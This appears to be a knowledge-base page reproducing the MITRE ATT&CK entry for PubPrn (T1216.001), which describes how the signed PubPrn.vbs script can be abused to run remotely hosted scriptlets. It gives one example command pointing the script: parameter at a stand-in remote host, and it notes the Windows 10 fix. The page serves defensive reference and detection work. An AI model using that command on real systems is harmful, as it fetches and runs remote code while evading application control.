---
mitre_data:
  id: T1216.001
  linker_tags:
  - mitre/attack/linker/stealth/pubprn
  name: PubPrn
  related_tactics:
  - stealth
tags:
- mitre/attack/technique
---



# PubPrn (`T1216.001`)

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.[^fn1]

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.[^fn2] To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).


# Platform(s)

- Windows

# Parent Technique(s)

- [[../Techniques/System Script Proxy Execution (T1216)|System Script Proxy Execution]]

# Tactic(s)

- [[../Tactics/7. Stealth|Stealth]]


# External Reference(s)

- [T1216.001](https://attack.mitre.org/techniques/T1216/001)

[^fn1]: [Jason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021.](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn)
[^fn2]: [Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)